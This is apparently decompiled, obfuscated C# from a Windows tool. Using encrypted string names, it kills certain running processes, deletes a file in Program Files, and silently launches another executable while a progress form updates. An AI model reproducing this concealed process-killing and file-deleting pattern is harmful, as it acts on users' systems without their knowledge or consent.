using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace ns1;

internal sealed class Class10
{
	public class Class11
	{
		[DebuggerNonUserCode]
		public Class11()
		{
		}

		public void method_0()
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (process.ProcessName.Contains(Class9.smethod_0("rcnFyMYM", "False")) | process.ProcessName.Contains(Class9.smethod_0("aqaipaMv", "False")))
					{
						process.Kill();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			MainForm mainForm = Class1.smethod_2().method_0();
			double double_ = 5.0;
			mainForm.method_5(ref double_);
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class9.smethod_0("gpTAuKaTna/Cs4yqs6+YmqatwIaWsZC0uYdvwrerIA==", "False");
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			MainForm mainForm2 = Class1.smethod_2().method_0();
			double_ = 2.0;
			mainForm2.method_5(ref double_);
			try
			{
				Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class9.smethod_0("fI66sqCNl5nBpIGodLK3hSc=", "False"), (AppWinStyle)2, false, -1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}
}
